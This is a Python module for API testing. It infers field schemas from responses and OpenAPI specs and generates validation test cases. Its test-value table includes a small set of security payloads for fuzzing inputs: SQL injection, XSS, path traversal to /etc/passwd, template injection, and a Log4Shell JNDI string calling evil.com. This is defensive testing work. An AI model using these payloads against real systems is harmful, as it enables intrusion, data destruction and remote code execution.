# -*- coding: utf-8 -*-
"""
Schema Analyzer and Inference Module
Analyzes API responses to infer schema and generate comprehensive test cases
"""

import json
import re
from typing import Dict, Any, List, Optional, Union, Set
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import uuid

class FieldType(Enum):
    """Detected field types"""
    STRING = "string"
    INTEGER = "integer"
    NUMBER = "number"
    BOOLEAN = "boolean"
    ARRAY = "array"
    OBJECT = "object"
    NULL = "null"
    DATE = "date"
    DATETIME = "datetime"
    EMAIL = "email"
    URL = "url"
    UUID = "uuid"
    PHONE = "phone"
    IP_ADDRESS = "ip"
    ENUM = "enum"

@dataclass
class FieldSchema:
    """Schema for a single field"""
    name: str
    type: FieldType
    nullable: bool = False
    required: bool = True
    min_value: Optional[Union[int, float]] = None
    max_value: Optional[Union[int, float]] = None
    min_length: Optional[int] = None
    max_length: Optional[int] = None
    pattern: Optional[str] = None
    enum_values: Optional[List[Any]] = None
    format: Optional[str] = None
    example: Any = None
    children: Optional[Dict[str, 'FieldSchema']] = None
    array_item_type: Optional['FieldSchema'] = None

@dataclass
class TestCase:
    """Represents a test case for schema validation"""
    name: str
    description: str
    test_type: str  # positive, negative, boundary, security
    input_modification: Dict[str, Any]
    expected_status: int
    expected_error: Optional[str] = None
    validation_type: Optional[str] = None

class SchemaAnalyzer:
    """Analyzes responses and infers schema for comprehensive testing"""

    def __init__(self):
        # Patterns for detecting specific formats
        self.patterns = {
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
            'url': r'^https?://[^\s/$.?#].[^\s]*$',
            'uuid': r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$',
            'phone': r'^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,4}[-\s\.]?[0-9]{1,9}$',
            'ip': r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$',
            'date': r'^\d{4}-\d{2}-\d{2}$',
            'datetime': r'^\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}'
        }

    def infer_schema_from_response(self, response: Union[Dict, List, str]) -> Dict[str, FieldSchema]:
        """
        Infer schema from API response

        Args:
            response: The API response (can be JSON object, array, or string)

        Returns:
            Dictionary of field schemas
        """
        if isinstance(response, str):
            try:
                response = json.loads(response)
            except json.JSONDecodeError:
                # Plain text response
                return {"response": FieldSchema(name="response", type=FieldType.STRING, example=response)}

        if isinstance(response, list):
            # Array response
            if response:
                item_schema = self._analyze_value("item", response[0])
                return {"response": FieldSchema(
                    name="response",
                    type=FieldType.ARRAY,
                    array_item_type=item_schema,
                    example=response
                )}
            else:
                return {"response": FieldSchema(name="response", type=FieldType.ARRAY, example=[])}

        # Object response
        schema = {}
        for key, value in response.items():
            schema[key] = self._analyze_value(key, value)

        return schema

    def _analyze_value(self, field_name: str, value: Any) -> FieldSchema:
        """Analyze a single value and infer its schema"""

        # Handle null values
        if value is None:
            return FieldSchema(name=field_name, type=FieldType.NULL, nullable=True)

        # Handle booleans
        if isinstance(value, bool):
            return FieldSchema(name=field_name, type=FieldType.BOOLEAN, example=value)

        # Handle integers
        if isinstance(value, int):
            return FieldSchema(
                name=field_name,
                type=FieldType.INTEGER,
                example=value,
                min_value=value,  # Will be updated with actual constraints
                max_value=value
            )

        # Handle floats
        if isinstance(value, float):
            return FieldSchema(
                name=field_name,
                type=FieldType.NUMBER,
                example=value,
                min_value=value,
                max_value=value
            )

        # Handle strings
        if isinstance(value, str):
            field_type, format_type = self._detect_string_format(value)
            return FieldSchema(
                name=field_name,
                type=field_type,
                format=format_type,
                example=value,
                min_length=len(value),
                max_length=len(value)
            )

        # Handle arrays
        if isinstance(value, list):
            item_schema = None
            if value:
                item_schema = self._analyze_value(f"{field_name}_item", value[0])

            return FieldSchema(
                name=field_name,
                type=FieldType.ARRAY,
                array_item_type=item_schema,
                example=value
            )

        # Handle objects
        if isinstance(value, dict):
            children = {}
            for key, val in value.items():
                children[key] = self._analyze_value(key, val)

            return FieldSchema(
                name=field_name,
                type=FieldType.OBJECT,
                children=children,
                example=value
            )

        # Default case
        return FieldSchema(name=field_name, type=FieldType.STRING, example=str(value))

    def _detect_string_format(self, value: str) -> tuple[FieldType, Optional[str]]:
        """Detect special string formats"""

        # Check against patterns
        for format_name, pattern in self.patterns.items():
            if re.match(pattern, value):
                if format_name in ['email']:
                    return FieldType.EMAIL, 'email'
                elif format_name in ['url']:
                    return FieldType.URL, 'url'
                elif format_name in ['uuid']:
                    return FieldType.UUID, 'uuid'
                elif format_name in ['phone']:
                    return FieldType.PHONE, 'phone'
                elif format_name in ['ip']:
                    return FieldType.IP_ADDRESS, 'ipv4'
                elif format_name in ['date']:
                    return FieldType.DATE, 'date'
                elif format_name in ['datetime']:
                    return FieldType.DATETIME, 'date-time'

        return FieldType.STRING, None

    def parse_openapi_schema(self, openapi_spec: Dict[str, Any]) -> Dict[str, Dict[str, FieldSchema]]:
        """
        Parse OpenAPI/Swagger specification to extract schemas

        Args:
            openapi_spec: OpenAPI specification dictionary

        Returns:
            Dictionary mapping endpoint paths to field schemas
        """
        endpoint_schemas = {}

        # Get component schemas
        component_schemas = {}
        if "components" in openapi_spec:  # OpenAPI 3.0
            component_schemas = openapi_spec.get("components", {}).get("schemas", {})
        elif "definitions" in openapi_spec:  # Swagger 2.0
            component_schemas = openapi_spec.get("definitions", {})

        # Parse paths
        paths = openapi_spec.get("paths", {})
        for path, path_item in paths.items():
            for method, operation in path_item.items():
                if method.lower() in ["get", "post", "put", "patch", "delete"]:
                    endpoint_key = f"{method.upper()} {path}"

                    # Parse request body schema
                    request_schema = self._extract_request_schema(operation, component_schemas)
                    if request_schema:
                        endpoint_schemas[endpoint_key] = request_schema

                    # Parse response schema
                    response_schema = self._extract_response_schema(operation, component_schemas)
                    if response_schema:
                        endpoint_schemas[f"{endpoint_key}_response"] = response_schema

        return endpoint_schemas

    def _extract_request_schema(self, operation: Dict, component_schemas: Dict) -> Optional[Dict[str, FieldSchema]]:
        """Extract request body schema from operation"""
        schema_dict = {}

        # OpenAPI 3.0 requestBody
        if "requestBody" in operation:
            content = operation["requestBody"].get("content", {})
            for content_type, media_type in content.items():
                if "schema" in media_type:
                    schema = media_type["schema"]
                    return self._parse_json_schema(schema, component_schemas)

        # Swagger 2.0 parameters
        parameters = operation.get("parameters", [])
        for param in parameters:
            if param.get("in") == "body" and "schema" in param:
                return self._parse_json_schema(param["schema"], component_schemas)
            elif param.get("in") in ["query", "path", "header"]:
                field_schema = self._param_to_field_schema(param)
                schema_dict[param["name"]] = field_schema

        return schema_dict if schema_dict else None

    def _extract_response_schema(self, operation: Dict, component_schemas: Dict) -> Optional[Dict[str, FieldSchema]]:
        """Extract response schema from operation"""
        responses = operation.get("responses", {})

        # Look for 200/201 response
        for status_code in ["200", "201", "default"]:
            if status_code in responses:
                response = responses[status_code]

                # OpenAPI 3.0
                if "content" in response:
                    content = response["content"]
                    for content_type, media_type in content.items():
                        if "schema" in media_type:
                            return self._parse_json_schema(media_type["schema"], component_schemas)

                # Swagger 2.0
                elif "schema" in response:
                    return self._parse_json_schema(response["schema"], component_schemas)

        return None

    def _parse_json_schema(self, schema: Dict, component_schemas: Dict) -> Dict[str, FieldSchema]:
        """Parse JSON Schema to FieldSchema"""

        # Handle references
        if "$ref" in schema:
            ref_path = schema["$ref"]
            ref_name = ref_path.split("/")[-1]
            if ref_name in component_schemas:
                schema = component_schemas[ref_name]

        field_schemas = {}

        if schema.get("type") == "object" and "properties" in schema:
            required_fields = set(schema.get("required", []))

            for prop_name, prop_schema in schema["properties"].items():
                field_schemas[prop_name] = self._json_schema_to_field_schema(
                    prop_name,
                    prop_schema,
                    prop_name in required_fields,
                    component_schemas
                )

        return field_schemas

    def _json_schema_to_field_schema(self, name: str, json_schema: Dict, required: bool, component_schemas: Dict) -> FieldSchema:
        """Convert JSON Schema to FieldSchema"""

        # Handle references
        if "$ref" in json_schema:
            ref_path = json_schema["$ref"]
            ref_name = ref_path.split("/")[-1]
            if ref_name in component_schemas:
                json_schema = component_schemas[ref_name]

        schema_type = json_schema.get("type", "string")

        field_schema = FieldSchema(
            name=name,
            type=self._map_json_schema_type(schema_type),
            required=required,
            nullable=json_schema.get("nullable", False)
        )

        # Extract constraints
        if "minimum" in json_schema:
            field_schema.min_value = json_schema["minimum"]
        if "maximum" in json_schema:
            field_schema.max_value = json_schema["maximum"]
        if "minLength" in json_schema:
            field_schema.min_length = json_schema["minLength"]
        if "maxLength" in json_schema:
            field_schema.max_length = json_schema["maxLength"]
        if "pattern" in json_schema:
            field_schema.pattern = json_schema["pattern"]
        if "enum" in json_schema:
            field_schema.enum_values = json_schema["enum"]
            field_schema.type = FieldType.ENUM
        if "format" in json_schema:
            field_schema.format = json_schema["format"]
            # Update type based on format
            if json_schema["format"] == "email":
                field_schema.type = FieldType.EMAIL
            elif json_schema["format"] == "uri":
                field_schema.type = FieldType.URL
            elif json_schema["format"] == "uuid":
                field_schema.type = FieldType.UUID
            elif json_schema["format"] == "date":
                field_schema.type = FieldType.DATE
            elif json_schema["format"] == "date-time":
                field_schema.type = FieldType.DATETIME
        if "example" in json_schema:
            field_schema.example = json_schema["example"]

        # Handle nested objects
        if schema_type == "object" and "properties" in json_schema:
            field_schema.children = {}
            required_children = set(json_schema.get("required", []))
            for child_name, child_schema in json_schema["properties"].items():
                field_schema.children[child_name] = self._json_schema_to_field_schema(
                    child_name,
                    child_schema,
                    child_name in required_children,
                    component_schemas
                )

        # Handle arrays
        if schema_type == "array" and "items" in json_schema:
            field_schema.array_item_type = self._json_schema_to_field_schema(
                f"{name}_item",
                json_schema["items"],
                True,
                component_schemas
            )

        return field_schema

    def _map_json_schema_type(self, json_type: str) -> FieldType:
        """Map JSON Schema type to FieldType"""
        mapping = {
            "string": FieldType.STRING,
            "integer": FieldType.INTEGER,
            "number": FieldType.NUMBER,
            "boolean": FieldType.BOOLEAN,
            "array": FieldType.ARRAY,
            "object": FieldType.OBJECT,
            "null": FieldType.NULL
        }
        return mapping.get(json_type, FieldType.STRING)

    def _param_to_field_schema(self, param: Dict) -> FieldSchema:
        """Convert API parameter to FieldSchema"""
        return FieldSchema(
            name=param.get("name", ""),
            type=self._map_json_schema_type(param.get("type", "string")),
            required=param.get("required", False),
            min_value=param.get("minimum"),
            max_value=param.get("maximum"),
            min_length=param.get("minLength"),
            max_length=param.get("maxLength"),
            pattern=param.get("pattern"),
            enum_values=param.get("enum"),
            format=param.get("format"),
            example=param.get("example")
        )


class TestGenerator:
    """Generates comprehensive test cases based on schema"""

    def __init__(self):
        self.test_values = {
            FieldType.STRING: {
                'valid': ["test", "Test String 123", "example"],
                'invalid_type': [123, True, {"key": "value"}, ["array"], None],
                'boundary': ["", " " * 1000, "a", "Special!@#$%^&*()"],
                'security': ["'; DROP TABLE users--", "<script>alert('XSS')</script>",
                           "../../etc/passwd", "{{7*7}}", "${jndi:ldap://evil.com/a}"]
            },
            FieldType.INTEGER: {
                'valid': [1, 100, 999],
                'invalid_type': ["string", True, {"key": "value"}, ["array"], 3.14],
                'boundary': [0, -1, 2147483647, -2147483648],
                'special': [None, "123", ""]
            },
            FieldType.NUMBER: {
                'valid': [1.5, 100.25, 999.99],
                'invalid_type': ["string", True, {"key": "value"}, ["array"]],
                'boundary': [0.0, -0.1, 1.7976931348623157e+308, -1.7976931348623157e+308],
                'special': [None, "123.45", "NaN", "Infinity", "-Infinity"]
            },
            FieldType.BOOLEAN: {
                'valid': [True, False],
                'invalid_type': ["true", "false", 1, 0, "yes", "no"],
                'special': [None, ""]
            },
            FieldType.EMAIL: {
                'valid': ["test@example.com", "user.name+tag@domain.co.uk"],
                'invalid': ["notanemail", "@example.com", "test@", "test@.com", "test..@example.com"],
                'security': ["test@evil.com<script>alert(1)</script>", "admin'--@example.com"]
            },
            FieldType.URL: {
                'valid': ["https://example.com", "http://sub.domain.com/path?query=1"],
                'invalid': ["not-a-url", "ftp://example.com", "//example.com", "example.com"],
                'security': ["https://evil.com/redirect?url=internal", "javascript:alert(1)"]
            },
            FieldType.UUID: {
                'valid': ["550e8400-e29b-41d4-a716-446655440000"],
                'invalid': ["not-a-uuid", "550e8400-e29b-41d4-a716", "550e8400e29b41d4a716446655440000"],
                'special': ["00000000-0000-0000-0000-000000000000", "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"]
            },
            FieldType.DATE: {
                'valid': ["2024-01-15", "2023-12-31"],
                'invalid': ["2024-13-01", "2024-01-32", "2024/01/15", "15-01-2024"],
                'boundary': ["1900-01-01", "2999-12-31", "2024-02-29"]
            },
            FieldType.DATETIME: {
                'valid': ["2024-01-15T10:30:00Z", "2024-01-15T10:30:00+05:30"],
                'invalid': ["2024-01-15 25:00:00", "not-a-datetime"],
                'boundary': ["1970-01-01T00:00:00Z", "2038-01-19T03:14:07Z"]
            }
        }

    def generate_test_cases(self, schema: Dict[str, FieldSchema],
                           include_security: bool = True,
                           include_boundary: bool = True) -> List[TestCase]:
        """
        Generate comprehensive test cases based on schema

        Args:
            schema: Dictionary of field schemas
            include_security: Include security test cases
            include_boundary: Include boundary test cases

        Returns:
            List of test cases
        """
        test_cases = []

        # Positive test case
        test_cases.append(self._generate_positive_test(schema))

        # Field-specific tests
        for field_name, field_schema in schema.items():
            # Type validation tests
            test_cases.extend(self._generate_type_tests(field_name, field_schema))

            # Required field tests
            if field_schema.required:
                test_cases.append(self._generate_missing_field_test(field_name, field_schema))

            # Constraint tests
            test_cases.extend(self._generate_constraint_tests(field_name, field_schema))

            # Boundary tests
            if include_boundary:
                test_cases.extend(self._generate_boundary_tests(field_name, field_schema))

            # Security tests
            if include_security and field_schema.type in [FieldType.STRING, FieldType.EMAIL, FieldType.URL]:
                test_cases.extend(self._generate_security_tests(field_name, field_schema))

            # Enum tests
            if field_schema.enum_values:
                test_cases.extend(self._generate_enum_tests(field_name, field_schema))

            # Nested object tests
            if field_schema.type == FieldType.OBJECT and field_schema.children:
                test_cases.extend(self._generate_nested_tests(field_name, field_schema))

            # Array tests
            if field_schema.type == FieldType.ARRAY:
                test_cases.extend(self._generate_array_tests(field_name, field_schema))

        return test_cases

    def _generate_positive_test(self, schema: Dict[str, FieldSchema]) -> TestCase:
        """Generate a positive test case with valid data"""
        valid_data = {}
        for field_name, field_schema in schema.items():
            valid_data[field_name] = self._get_valid_value(field_schema)

        return TestCase(
            name="valid_request",
            description="Valid request with all correct field types and values",
            test_type="positive",
            input_modification=valid_data,
            expected_status=200
        )

    def _generate_type_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate type validation tests"""
        test_cases = []

        if field_schema.type in self.test_values:
            invalid_types = self.test_values[field_schema.type].get('invalid_type', [])

            for invalid_value in invalid_types:
                test_cases.append(TestCase(
                    name=f"invalid_type_{field_name}_{type(invalid_value).__name__}",
                    description=f"Invalid type for {field_name}: {type(invalid_value).__name__} instead of {field_schema.type.value}",
                    test_type="negative",
                    input_modification={field_name: invalid_value},
                    expected_status=400,
                    expected_error=f"Invalid type for field {field_name}",
                    validation_type="type_validation"
                ))

        return test_cases

    def _generate_missing_field_test(self, field_name: str, field_schema: FieldSchema) -> TestCase:
        """Generate test for missing required field"""
        return TestCase(
            name=f"missing_required_{field_name}",
            description=f"Missing required field: {field_name}",
            test_type="negative",
            input_modification={"_remove": field_name},
            expected_status=400,
            expected_error=f"Missing required field: {field_name}",
            validation_type="required_field"
        )

    def _generate_constraint_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate constraint validation tests"""
        test_cases = []

        # Min/Max value tests for numbers
        if field_schema.type in [FieldType.INTEGER, FieldType.NUMBER]:
            if field_schema.min_value is not None:
                test_cases.append(TestCase(
                    name=f"below_min_{field_name}",
                    description=f"{field_name} below minimum value {field_schema.min_value}",
                    test_type="boundary",
                    input_modification={field_name: field_schema.min_value - 1},
                    expected_status=400,
                    expected_error=f"Value below minimum for {field_name}",
                    validation_type="min_value"
                ))

            if field_schema.max_value is not None:
                test_cases.append(TestCase(
                    name=f"above_max_{field_name}",
                    description=f"{field_name} above maximum value {field_schema.max_value}",
                    test_type="boundary",
                    input_modification={field_name: field_schema.max_value + 1},
                    expected_status=400,
                    expected_error=f"Value above maximum for {field_name}",
                    validation_type="max_value"
                ))

        # Min/Max length tests for strings
        if field_schema.type == FieldType.STRING:
            if field_schema.min_length is not None and field_schema.min_length > 0:
                test_cases.append(TestCase(
                    name=f"too_short_{field_name}",
                    description=f"{field_name} shorter than minimum length {field_schema.min_length}",
                    test_type="boundary",
                    input_modification={field_name: "a" * (field_schema.min_length - 1)},
                    expected_status=400,
                    expected_error=f"String too short for {field_name}",
                    validation_type="min_length"
                ))

            if field_schema.max_length is not None:
                test_cases.append(TestCase(
                    name=f"too_long_{field_name}",
                    description=f"{field_name} longer than maximum length {field_schema.max_length}",
                    test_type="boundary",
                    input_modification={field_name: "a" * (field_schema.max_length + 1)},
                    expected_status=400,
                    expected_error=f"String too long for {field_name}",
                    validation_type="max_length"
                ))

        # Pattern tests
        if field_schema.pattern:
            test_cases.append(TestCase(
                name=f"invalid_pattern_{field_name}",
                description=f"{field_name} doesn't match required pattern",
                test_type="negative",
                input_modification={field_name: "INVALID_PATTERN_VALUE"},
                expected_status=400,
                expected_error=f"Pattern mismatch for {field_name}",
                validation_type="pattern"
            ))

        return test_cases

    def _generate_boundary_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate boundary value tests"""
        test_cases = []

        if field_schema.type in self.test_values:
            boundary_values = self.test_values[field_schema.type].get('boundary', [])

            for boundary_value in boundary_values:
                test_cases.append(TestCase(
                    name=f"boundary_{field_name}_{str(boundary_value)[:20]}",
                    description=f"Boundary test for {field_name}: {str(boundary_value)[:50]}",
                    test_type="boundary",
                    input_modification={field_name: boundary_value},
                    expected_status=200,  # May be 400 depending on constraints
                    validation_type="boundary"
                ))

        return test_cases

    def _generate_security_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate security test cases"""
        test_cases = []

        security_payloads = self.test_values.get(field_schema.type, {}).get('security', [])

        for payload in security_payloads:
            test_cases.append(TestCase(
                name=f"security_{field_name}_{payload[:20].replace(' ', '_')}",
                description=f"Security test for {field_name}: {payload[:50]}",
                test_type="security",
                input_modification={field_name: payload},
                expected_status=400,
                expected_error="Potential security threat detected",
                validation_type="security"
            ))

        return test_cases

    def _generate_enum_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate enum validation tests"""
        test_cases = []

        # Invalid enum value
        test_cases.append(TestCase(
            name=f"invalid_enum_{field_name}",
            description=f"Invalid enum value for {field_name}",
            test_type="negative",
            input_modification={field_name: "INVALID_ENUM_VALUE"},
            expected_status=400,
            expected_error=f"Invalid enum value for {field_name}",
            validation_type="enum"
        ))

        # Each valid enum value
        for enum_value in field_schema.enum_values or []:
            test_cases.append(TestCase(
                name=f"enum_{field_name}_{str(enum_value)}",
                description=f"Valid enum value for {field_name}: {enum_value}",
                test_type="positive",
                input_modification={field_name: enum_value},
                expected_status=200,
                validation_type="enum"
            ))

        return test_cases

    def _generate_nested_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate tests for nested objects"""
        test_cases = []

        # Missing nested object
        test_cases.append(TestCase(
            name=f"missing_nested_{field_name}",
            description=f"Missing nested object: {field_name}",
            test_type="negative",
            input_modification={field_name: None},
            expected_status=400,
            expected_error=f"Missing nested object: {field_name}",
            validation_type="nested_object"
        ))

        # Invalid type for nested object
        test_cases.append(TestCase(
            name=f"invalid_nested_type_{field_name}",
            description=f"Invalid type for nested object: {field_name}",
            test_type="negative",
            input_modification={field_name: "string_instead_of_object"},
            expected_status=400,
            expected_error=f"Invalid type for nested object: {field_name}",
            validation_type="nested_object"
        ))

        return test_cases

    def _generate_array_tests(self, field_name: str, field_schema: FieldSchema) -> List[TestCase]:
        """Generate tests for array fields"""
        test_cases = []

        # Empty array
        test_cases.append(TestCase(
            name=f"empty_array_{field_name}",
            description=f"Empty array for {field_name}",
            test_type="boundary",
            input_modification={field_name: []},
            expected_status=200,
            validation_type="array"
        ))

        # Wrong type instead of array
        test_cases.append(TestCase(
            name=f"not_array_{field_name}",
            description=f"Non-array value for array field {field_name}",
            test_type="negative",
            input_modification={field_name: "not_an_array"},
            expected_status=400,
            expected_error=f"Expected array for {field_name}",
            validation_type="array"
        ))

        # Array with wrong item type
        if field_schema.array_item_type:
            test_cases.append(TestCase(
                name=f"wrong_array_items_{field_name}",
                description=f"Array with wrong item type for {field_name}",
                test_type="negative",
                input_modification={field_name: ["wrong", "type", "items"]},
                expected_status=400,
                expected_error=f"Invalid array item type for {field_name}",
                validation_type="array_items"
            ))

        return test_cases

    def _get_valid_value(self, field_schema: FieldSchema) -> Any:
        """Get a valid value for a field based on its schema"""
        if field_schema.example is not None:
            return field_schema.example

        if field_schema.enum_values:
            return field_schema.enum_values[0]

        valid_values = self.test_values.get(field_schema.type, {}).get('valid', [])
        if valid_values:
            return valid_values[0]

        # Default values
        if field_schema.type == FieldType.STRING:
            return "example"
        elif field_schema.type == FieldType.INTEGER:
            return 1
        elif field_schema.type == FieldType.NUMBER:
            return 1.0
        elif field_schema.type == FieldType.BOOLEAN:
            return True
        elif field_schema.type == FieldType.ARRAY:
            return []
        elif field_schema.type == FieldType.OBJECT:
            return {}

        return None


# Export classes
__all__ = [
    'SchemaAnalyzer',
    'TestGenerator',
    'FieldSchema',
    'FieldType',
    'TestCase'
]